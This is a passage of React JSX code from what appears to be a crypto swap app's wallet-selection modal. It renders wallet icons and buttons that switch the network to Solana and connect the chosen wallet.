                            <rect x="24" y="24" width="6" height="6" rx="1" fill="white"/>
                          </svg>
                        ),
                      };
                      return walletIcons[wallet.icon] || <div className="w-full h-full bg-gray-200 rounded-lg" />;
                    };
                    return (
                      <button
                        key={wallet.id}
                        onClick={() => {
                          setNetworkType("solana");
                          setSellToken(SOLANA_TOKENS[0]);
                          setBuyToken(null);
                          connectSolanaWallet(wallet.id);
                          setShowUnifiedWalletModal(false);
                        }}
                        className="flex items-center gap-3 p-3 rounded-xl bg-gray-50 hover:bg-gray-100 border border-gray-200 transition-all"
                        data-testid={`wallet-${wallet.id}`}
                      >
                        <div className="w-8 h-8 rounded-lg overflow-hidden flex items-center justify-center">
                          {renderWalletIcon()}
                        </div>
                        <span className="text-gray-900 font-medium text-sm">{wallet.name}</span>
                        {isAvailable && (
                          <div className="w-2 h-2 rounded-full bg-green-500 ml-auto" />
                        )}
                      </button>
                    );
                  })}
                </div>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
}
